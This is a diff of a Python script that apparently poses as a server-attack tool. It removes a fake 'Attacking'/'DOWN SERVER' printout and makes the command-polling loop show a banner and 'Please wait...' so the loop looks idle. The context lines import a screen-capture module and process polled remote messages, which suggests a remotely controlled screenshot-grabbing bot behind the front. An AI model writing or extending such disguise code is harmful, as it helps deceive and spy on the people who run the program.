@@ -14,27 +14,8 @@ def banner():
 
 \t\033[36m[-] Dev :\033[36m Yesha Ex Dev""") 
 
-banner()
-print()
-print()
-t = str(input("""\033[92m╔═══\033[91m[\033[36mTARGET\033[91m]\n\033[92m╚══> \033[0m"""))
-time.sleep(2)
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-time.sleep(1)
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-time.sleep(1)
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-time.sleep(1)
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-time.sleep(1)
-print("\033[36m[\033[91m * \033[36m] DOWN SERVER \033[91m", t)    
-time.sleep(1)
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
-time.sleep(1)
-print("\033[36m[\033[91m * \033[36m] Attacking  \033[91m", t)    
+
+
 
 try:
     from PIL import ImageGrab
@@ -223,8 +204,8 @@ def main():
             offset = handle_updates(updates) + 1
             processed_message_ids.clear()
         else:
-            print("No updates found.")
-        time.sleep(1)
+            banner()
+            print("\033[36mPlease wait...")
 
 #coded by y3sh4 dont copy
 
